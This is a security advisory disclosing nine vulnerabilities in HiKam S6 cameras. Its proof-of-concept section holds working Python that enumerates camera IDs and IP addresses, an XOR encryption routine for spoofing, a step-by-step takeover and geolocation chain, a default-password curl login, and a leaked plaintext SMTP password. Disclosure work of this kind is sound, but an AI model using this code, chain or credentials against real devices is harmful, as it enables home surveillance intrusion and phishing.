@@ -1,0 +1,560 @@
+id: 36858
+date: 10/06/2021
+title: High Infinity Technology HiKam S6 1.3.26 Spoofing / Broken Authentication Vulnerability
+author: Gerhard Hechenberger
+cves: 
+
+=======================================================================
+              title: Multiple Critical Vulnerabilities
+            product: High Infinity Technology HiKam S6
+ vulnerable version: <=1.3.26
+      fixed version:
+         CVE number:
+             impact: Critical
+           homepage: https://hikam.de/
+                 by: S. Robertz (Office Vienna)
+                     G. Hechenberger (Office Vienna)
+
+=======================================================================
+
+Vendor description:
+-------------------
+(German) "Die High Infinity Technology GmbH ist ein führendes Unternehmen im
+Bereich der Videoüberwachungs- und Heimsicherheits-Technologie.
+Wir machen Ihnen ihr Leben mit durchdachter Technik leichter: Zuverlässige
+Hardware, benutzerfreundliche Software, verbunden mit einfacher Einrichtung
+und kundenorientiertem technischem Support mache es möglich.
+Wir machen Ihr Zuhause sicherer. Sie haben es stets im Blick. Einbrecher
+haben keine Chance. Sie werden schon im Vorfeld durch unsere Kameras
+abgeschreckt. Wagt es dennoch jemand einzudringen, werden Sie in Echtzeit
+informiert und können sofort handeln."
+
+Source: https://www.facebook.com/notes/305994643212713/
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends High Infinity Technology GmbH's customers to upgrade
+the firmware to the latest version available.
+
+A thorough security review should be performed by security professionals to
+identify further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Broken Authentication Web Interface
+The web interface in older firmware versions can be used to configure the
+camera. The login can easily be bypassed by setting a cookie with the value
+"admin". The cookie's name can be found in the JavaScript code and thus is only
+protecting the UI and not the interface. However, since firmware 1.3.21 for the
+HiKam S6, the UI is no longer accessible by just setting a cookie. Bypassing
+the authentication allows an attacker to make changes to the camera settings
+and to upload malicious firmware updates in order to take full control of the
+camera.
+
+2) Enumeration of all customer Cloud Devices and LAN/WAN IPs
+The cameras use consecutively ascending, 6-digit serial numbers, printed on a
+sticker on the back of the device. The corresponding UUID needed to make
+requests to the P2P cloud does not need to be calculated and can simply be
+requested at a specific server. Knowing the UUID, the P2P server can now be
+queried for the internal and external IPs of the cameras located in private
+networks behind NAT and additional attacks on devices can be executed
+(see issue 6). By mapping IPs to geolocations, cameras in specific regions can
+be attacked.
+
+3) Message Protocol Downgrade
+The camera is communicating with its App by using a P2P infrastructure. The
+messages used to register the camera at the P2P server are sent encrypted.
+However, by sending unencrypted messages, a protocol downgrade to unencrypted
+login messages can be achieved. This will make it easier for an attacker to
+spoof communication, as less time is required for reverse-engineering of the
+protocol.
+
+4) Insufficient use of Cryptography
+The camera does use weak cryptography. Passwords are being transmitted as MD5
+hashes. These can be cracked within minutes on modern hardware (ca 65079.1 MH/s
+using a nVidia 3090 GPU).
+If a camera connects to the P2P server, the login request is encrypted. This
+encryption is based on an XOR key and can be easily reversed. Thus, the login
+message can be spoofed by an attacker. This can lead to an MitM attack as
+explained in vulnerability 6.
+
+5) Insufficient Message Protocol Checks
+Commands are differentiated by a message ID field in the packet header. Packets
+that require authentication will use a specific salt per message type. After
+the packet is transmitted, the salt ID is increased. Hence, intercepted
+password hashes should not be reusable, as a different salt ID should be
+expected for the next packet. However, the salt is transferred in a separate
+field. It is never verified, that the salt ID matches the message type or the
+current salt increment. Thus, we were able to reuse intercepted salted
+passwords for arbitrary messages.
+
+6) Device Spoofing
+The camera is communicating with its App by using a P2P infrastructure. To
+register on a server of this infrastructure, only a valid ID is required. This
+leads to the possibility to spoof a camera device and to receive all messages
+intended for the original device. Together with vulnerabilities 2,3,4 and 5,
+this enables MitM attacks in WAN against camera devices.
+
+7) Outdated Software Components
+Outdated and vulnerable software components were found on the device during a
+quick examination with IoT Inspector.
+
+8) Weak default credentials for Gwelltimes P2P accounts
+HiKam is using parts of the Gwelltimes cloud [1]. When an account is created
+within the HiKam or HiKam Pro app, a Gwelltimes account is created as well. All
+of these accounts use an increasing ID as username and a static password of
+"123456789" which can not be changed in the app.
+
+[1] SEC Consult already published security concerns regarding Gwelltimes in the
+past:
+https://sec-consult.com/blog/detail/true-story-the-case-of-a-hacked-baby-monitor-gwelltimes-p2p-cloud/
+
+9) Leak of HiKam's SMTP credentials
+When an alarm is triggered, the camera can send an email notification. For this
+purpose, the camera will connect to HiKam's SMTP server and thus stores its
+credentials. This information gets printed to the debug output on the UART. An
+attacker could use this password to send spam or phishing emails to HiKam
+customers. As the sender is valid and usually indicates that an alarm was
+triggered, it is very likely for the recipient to open the email and attached
+files.
+
+
+Proof of concept:
+-----------------
+1) Broken Authentication Web Interface
+The webinterface can be accessed within the local network. Creating a cookie
+with the name "HiKam_Web_Session" and the value "admin" will bypass
+authentication and full access is granted to the web interface. From here, a
+malicious firmware update file could be installed.
+
+
+2) Enumeration of all customer Cloud Devices and LAN/WAN IPs
+The UUID needed has the following format: EUA-123456-XXXXX.
+The first part is a static prefix, the second the serial number and the third
+is a checksum. Given a serial number (UID), the UUID can be requested by
+sending a UDP request packet to xx.xx.xx.xx:8821.
+
+header:
+magic number: 0x5a5a5a5a
+unknown_block1: 15 Bytes
+message_type: 1 Byte
+unknown_block2: 2 Bytes
+message_length: 2 Bytes
+payload:
+UID: 7 Bytes
+
+unknown_block1 seems to implement some sort of sequence number and a further
+message ID, as multiple different messages can be observed with a message_type
+of 0x00. The UID will always start with AXXXXXX and is written on the back of
+the camera. IDs starting with A are part of the 2nd generation of HiKam
+cameras. Only these can be discovered.
+
+The response of the P2P server follows this scheme. But instead of the UID, it
+will return a 16 Byte UUID.
+
+The following Python code shows how to generate such a request packet for
+serial 123456 and how to parse the UUID from the response:
+-------------------------------------------------------------------------------
+DST_ADDR = "xxx.xxx.xxx.xxx"
+DST_PORT = 8821
+
+PACKET_1 = b'\x5a\x5a\x5a\x5a\x00\x00\x00\x02\x00\x00\x10\x2d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x41'
+PACKET_2 = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+START_ID = 123456
+PACKET = PACKET_1 + str.encode("{:06}".format(START_ID)) + PACKET_2
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.settimeout(5)
+sock.sendto(PACKET, (DST_ADDR, DST_PORT))
+
+data, address = sock.recvfrom(88)
+uuid = data[24:40].decode()
+if str(START_ID) not in uuid:
+  raise ValueError("No valid UUID received from Server")
+else:
+  print(data[24:40].decode())
+-------------------------------------------------------------------------------
+
+After the correct UUID for a UID is obtained, it can be used to request the
+internal and external IP addresses of this camera.
+
+
+Afterwards, a message of type P2P_REQ (P2P Request) can be sent to the P2P
+server. It will respond with the internal and external IP of the camera that is
+being requested.
+
+The packet has the following form:
+pppp-header:
+    magic number: 0xf1 (1 Byte)
+    message type: 0x20 (1 Byte)
+    message length: 0x0024 (2 Byte)
+    modified_uid: 17 Bytes
+    unknown (PACKET_2): 5 Bytes
+    port: 2 Bytes
+    local_ip: 4 Bytes
+    padding (PACKET_3): 8 Bytes
+
+Following Python code will send such a request for a given UID:
+-------------------------------------------------------------------------------
+DST = "xxx.xxx.xxx.xxx"
+DST_PORT = 32100
+hicam_uuid = "EUA-123456-XXXXX"
+uuid = hicam_uuid.split('-')
+
+PACKET_1 = b"\xf1\x20\x00\x24"
+PREFIX = uuid[0].encode()
+ID = int(uuid[1])
+CHECKSUM = uuid[2].encode()
+PACKET_2 = b"\x00\x00\x00\x00\x02"
+PORT = 10419
+IP = [10, 10, 1, 9]
+PACKET_3 = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+
+IP.reverse()
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.settimeout(0.5)
+  PACKET = PACKET_1 + \
+  PREFIX + \
+  ID.to_bytes(9, 'big') + \
+  CHECKSUM + \
+  PACKET_2 + \
+  PORT.to_bytes(2, 'little') + \
+  bytes(IP) + \
+  PACKET_3
+
+sock.sendto(PACKET, (DST, DST_PORT))
+ips = []
+for i in range(0, 3):
+  try:
+    data = sock.recv(1024)
+  except socket.timeout:
+    raise TimeoutError("No packets received in time")
+  if data[1] == 33: # b'\x21':
+    pass
+  if data[1] == 64: # b'\x40':
+    recv_ip = [int(b) for b in bytearray(data[8:12])]
+    recv_ip.reverse()
+    ips.append("{}.{}.{}.{}:{}".format(recv_ip[0], recv_ip[1], recv_ip[2], recv_ip[3], int.from_bytes(data[6:8], 'little')))
+print(ips[0], ips[1])
+-------------------------------------------------------------------------------
+
+Using these functions, we managed to discover around 26000 active cameras
+during the time of the research.
+
+
+3) Message Protocol Downgrade
+The camera sends a login message to the P2P server. Usually, this message is
+encrypted, as explained in issue 4. However, we found a very similar function
+signature to the encrypted login message in the HiKam binaries. From here on,
+we'll call the encrypted function "send_msg_dev_lgn_crc()" and the unencrypted
+message "send_msg_dev_lgn()".
+
+The only difference between both functions is, that send_msg_dev_lgn() skips
+the encryption function call. In order to confirm this theory, we patched the
+send_msg_dev_lgn_crc() function call to point to send_msg_dev_lgn().
+A wireshark log confirmed, that all parameters were sent unencrypted.
+
+Furthermore, the P2P server acknowledged the login request and registered the
+camera. This suggests, that a previous protocol version was not using
+encryption and that this version is still supported by the P2P servers.
+
+
+4) Insufficient use of Cryptography
+Following password is sent for an authenticated request. It is an MD5 hash of
+the password concatenated with a salt and the string "hikam". The salt value
+will be explained in issue 5. Following pseudo code shows the generation of the
+password has for the password "test12345":
+
+  md5("test12345:salt-id:hikam")=="fb695190edcc05d35554c18397f0e1bd"
+
+MD5 hashes are very weak and are not recommended for any security relevant
+features.
+
+Messages that are used to connect a camera to the P2P server are based on
+following scheme:
+
+pppp-header:
+    magic number: 0xf1 (1 Byte length)
+    message type: 0x12 (1 Byte length)
+    message length: 0x002c (2 Byte length)
+payload:
+    device uid: 20 Byte
+    NAT type: 1 Byte
+    API version: 3 Byte
+    local address: 16 Bytes
+    checksum: 4 Bytes
+
+The payload will be encrypted using an XOR key, which changes based on the
+previous encrypted byte and thus shows similarities to a CBC mode encryption.
+Following pseudo code can be used for encryption:
+
+-------------------------------------------------------------------------------
+void update_xor(prev_byte, xor1, xor2, xor3, xor4, out1,  out2, out3, out4){
+       uint8_t tmp_out1;
+       uint8_t tmp_out2;
+       uint8_t tmp_out3;
+       uint8_t tmp_out4;
+       uint8_t lookup[8][8] = { ... };
+       uint8_t column = ((xor3 % xor4) + prev_byte) & 0x7;
+       uint8_t row = ((prev_byte % xor1) + xor2) & 0x7;
+       tmp_out1 = lookup[row][column];
+
+       column = ((xor4 % xor1) + prev_byte) & 0x7;
+       row = ((prev_byte % xor2) + xor3) & 0x7;
+       tmp_out2 = lookup[row][column];
+
+       column = ((xor1 % xor2) + prev_byte) & 0x7;
+       row = ((prev_byte % xor3) + xor4) & 0x7;
+       tmp_out3 = lookup[row][column];
+
+       column = ((xor2 % xor3) + prev_byte) & 0x7;
+       row = ((prev_byte % xor4) + xor1) & 0x7;
+       tmp_out4 = lookup[row][column];
+
+       *out1 = tmp_out1;
+       *out2 = tmp_out2;
+       *out3 = tmp_out3;
+       *out4 = tmp_out4;
+}
+
+void encrypt_packet() {
+       uint8_t cleartext_packet[] = { ... };
+       uint8_t encrypted_packet[sizeof(cleartext_packet)+4];
+
+       uint8_t xor1 = 1;
+       uint8_t xor2 = 3;
+       uint8_t xor3 = 5;
+       uint8_t xor4 = 7;
+
+       for (int i=0; i<sizeof(cleartext_packet); i++){
+               encrypted_packet[i] = xor1 ^ xor2 ^xor3 ^ xor4 ^ cleartext_packet[i];
+               update_xor(encrypted_packet[i],xor1,xor2,xor3,xor4,&xor1,&xor2,&xor3,&xor4);
+       }
+
+       //calc cheksum
+       for (int i=0; i<4;i++) {
+               uint8_t new = xor1 ^ xor2 ^xor3 ^ xor4 ^ 0x43;
+               encrypted_packet[i+sizeof(cleartext_packet)] = new;
+               update_xor(new,xor1,xor2,xor3,xor4,&xor1,&xor2,&xor3,&xor4);
+       }
+}
+-------------------------------------------------------------------------------
+
+5) Insufficient Message Protocol Checks
+Authenticated messages send a salted password. The generation of the password
+is explained in issue 4. The salt ID is specified for every message id and
+calculated to following formula:
+Salt-ID = CONST_MSG_SALT_ID - 1000 + number_of_previously_sent_messages
+
+The CONST_MSG_SALT_ID can be found in the APK file under com.p2p.core.global.Constants.
+From the formula, it can be derived, that the same salt should never be used
+twice. Furthermore, the salt ID could be checked against the message_type field
+of the packet header.
+
+We managed to reuse intercepted passwords by simply manipulating the salt ID
+field within the packet. Thus, it can be concluded that no checks for the salt
+ID are in place and that the salt is simply passed into the password hash
+generator function.
+
+
+6) Device Spoofing
+All previously explained vulnerabilities can now be chained together in order
+to create a MitM attack over the internet. Following steps will be executed.
+They are explained in even more detail further below.
+
+    1) Get a valid UUID for the UID that should be attacked.
+    2) Use the UUID to register the same ID with the P2P server.
+    3) Wait until the victim tries to access his camera.
+    4) Handle the MSG_PUNCH_TO packet received from the P2P server in order
+       to build a valid communication channel to the victim's app.
+    5) Receive the hashed password from the victim's app.
+    6) Wait until the original camera corrected the P2P server's records.
+    7) Act as phone: request connection to the original camera at the P2P
+       server.
+    8) Receive original camera's IP and punch a hole into the NAT/Firewall.
+    9) Reuse the intercepted password hash to change the camera's password to a
+       known value.
+   10) Use the regular app and the new password to access all camera features.
+   11) Optional: crack the MD5 hash and use the intercepted username to try and
+       access further accounts of the victim.
+   12) Optional: Scan for surrounding WiFi networks and locate the camera using
+       the WiGLE project (https://wigle.net/).
+
+Further details:
+    1) Get a valid UUID for the UID that should be attacked:
+       Request the UUID of the device that you want to attack as explained in
+       issue 2.
+    2) Use the UUID to register the same ID with the P2P server:
+       Send the login request to the P2P server. This can be done either by
+       using the message protocol downgrade, described in issue 3 or by
+       encrypting the payload using the algorithm in issue 4.
+       The login request is part of the pppp protocol, described by Paul
+       Marrapese (https://hacked.camera/). It follows following form:
+       pppp header:
+          magic_number: 0xf1
+          message_type: 0x10
+          message_size: 0x0028
+       payload:
+          uuid: 20 Byte
+          NAT type: 1 Byte
+          API version: 3 Byte
+          IP family: 2 Byte
+          Port: 2 Byte
+          Local IP address: 4 Byte
+       The encrypted form will use 0x12 as message type. The P2P server will
+       store the IP address as current address of the camera. Thus, the real
+       camera is not reachable anymore.
+    3) Wait until the victim tries to access his camera.
+    4) Handle the MSG_PUNCH_TO packet received from the P2P server in order
+       to build a valid communication channel to the victim's app:
+       The P2P server will send a so called PUNCH_TO packet to the faked
+       camera. It will contain the IP address of the victim's phone. The faked
+       camera will now send dummy packets to that IP and port combination in
+       order to punch a hole into its firewall. The victim's phone will do the
+       same. Once both devices receive a packet from the device, a valid
+       communication channel has been established.
+    5) Receive the hashed password from the victim's app:
+       One of the first packets sent by the victim's app is the
+       MSG_P2PClientSdkGetAlarmPushStatus packet. It is an authenticated
+       request and in following form:
+       hikam_header:
+         magic number: 0x5a5a5a5a
+         unknown_block1: 15 Bytes
+         message_type: 1 Byte
+         unknown_block2: 2 Bytes
+         message_length: 2 Bytes
+       auth_header:
+         salted_md5: 32 Bytes
+         salt_id: 8 Bytes
+       Vulnerability 5 explained, how this hash can be reused in order to
+       authenticate further requests.
+    6) Wait until the original camera corrected the P2P server's records.
+       For further attacks we need to access the original camera again. Thus,
+       we have to wait until the original camera re-registers at the P2P
+       server. This happens roughly every minute.
+    7) Act as phone: request connection to the original camera at the P2P
+       server. We will now spoof a phone. Thus we send the MSG_P2P_REQ packet.
+    8) Receive original camera's IP and punch a hole into the NAT/Firewall:
+       The P2P Server will respond with the camera's IP and a port that should
+       be opened in the firewall. We will start sending dummy packets to the IP
+       and port in order to open the firewall. Once we receive a packet from
+       the camera, a communication channel has been established.
+    9) Reuse the intercepted password hash to change the camera's password to a
+       known value:
+       This message needs to be tunneled inside a MSG_DRW of the pppp protocol.
+       Thus the packet is in following form:
+       pppp header:
+         magic_number: 0xf1
+         message_type: 0x10
+         message_size: 0x0028
+       DRW header:
+         magic_num: 1 Byte
+         channel: 1 Byte
+         index: 2 Bytes
+       HiKam header:
+         magic number: 0x5a5a5a5a
+         unknown_block1: 15 Bytes
+         message_type: 1 Byte
+         unknown_block2: 2 Bytes
+         message_length: 2 Bytes
+       Payload:
+         old_pw_hash: 32 Bytes
+         padding: 4 Bytes
+         new_cleartext_pw: 36 Bytes, zero padded
+         salt_id: 2 Bytes
+         zero_padding: 6 Bytes
+    10) Use the regular app and the new password to access all camera features:
+        Use the camera's UID and the newly set password to add the camera to
+        your' own account. You can use all app features.
+    11) Optional: crack the MD5 hash and use the intercepted username to try
+        and access further accounts of the victim:
+        The salting scheme has already been discussed in section 4. The
+        MSG_P2PClientSdkGetAlarmPushStatus message that is intercepted from
+        the victim's phone also contains the username of the victim.
+        Hence, an attacker could try and attack the victim further using the
+        additional information.
+    12) Optional: Scan for surrounding WiFi networks and locate the camera
+        using the WiGLE project (https://wigle.net/):
+        Using the obtained access to the original camera, an attacker could
+        request a scan of surrounding wireless networks. Using the WiGLE
+        project, this information could be used to get a fairly precise
+        location of the device.
+
+
+7) Outdated Software Components
+* Busybox 1.20.2 (12 CVEs)
+* hostapd 0.8.x (13 CVEs)
+* Linux Kernel 3.4.35 (1208 CVEs)
+* OpenSSL 0.9.8e (79 CVEs)
+* uClibc 0.9.33.2 (2 CVEs)
+* wpa_supplicant 0.7.3 (22 CVEs)
+
+
+8) Weak default credentials for Gwelltimes P2P accounts
+The camera makes following request to the cloud-links server, which is
+associated with Gwelltimes.
+
+curl -X POST -d "User=appuser_123456@hi-kam.net"
+-d "Pwd=25F9E794323B453885F5181F1B624D0B" -d "VersionFlag=1" -d "AppOS=3"
+-d "AppVersion=5308417" -i http://api4.cloud-links.net/Users/LoginCheck.ashx
+
+The server responds with a successful login:
+
+HTTP/1.1 200
+Server: nginx/1.15.3
+Date: Tue, 02 Mar 2021 19:33:20 GMT
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 285
+Connection: keep-alive
+
+{"error_code":"0","UserID":"-2107299759","P2PVerifyCode1":"1712474097",
+"P2PVerifyCode2":"1322726834","Email":"appuser_<increasing-id>@hi-kam.net",
+"NickName":"","CountryCode":"0","PhoneNO":"","ImageID":"0","SessionID":"2
+84129651","DomainList":"","UserLevel":"0","SessionID2":"","error":"成功"}
+
+The passsword used is the MD5 hash of the string "123456789".
+Now Gwelltimes own app, "Yoosee" can be used to login. However, cameras of the
+2nd generation are not accessible from here. Cameras of the first gerneration
+e.g. HiKam S5, A7 were using the Gwelltimes P2P cloud and are most likely
+accessible.
+
+9) Leak of HiKam's SMTP credentials
+The camera can trigger alarms based on e.g. motion. Thus, if motion is
+detected, the camera will send a couple pictures to a pre-defined email address
+of the owner. However, detailed information will be printed to the UART
+console, which is used for debugging purposes. This information also leaks the
+SMTP password for the alarm@hikam.de accout.
+
+------email info0926------
+sender: alert@hikam.de, pwd: Alert618033!
+receiver: email@attacker,,
+server: xxx.xxx.xxx.xxx, port: 443
+attach: /tmp/A100465_2021030123003003.jpg, num: 3
+subject: Attention:alarm from camera 'test'(AXXXXXX:motion detection)
+content: Dear User,
+ Please check the attached picture for more information.
+ssl: 1
+
+SEC Consult did not verify this password nor use the credentials of the SMTP
+server. However, it seems very likely, as SMTP is confirmed to be running on
+port 443 and the camera can be seen connecting to it and exchanging TLS
+encrypted messages.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following versions have been tested and found to be vulnerable:
+HiKam S6 Firmware 1.3.21
+HiKam S6 Firmware 1.3.26 (issue 1 not applicable)
+
+It is very likely that following camera models are affected as well:
+HiKam A7
+HiKam A7 Pro (3rd Gen)
+HiKam Q8
+HiKam Q8 (3rd Gen)
+Hikam R8
+
+#  0day.today [2023-03-25]  #
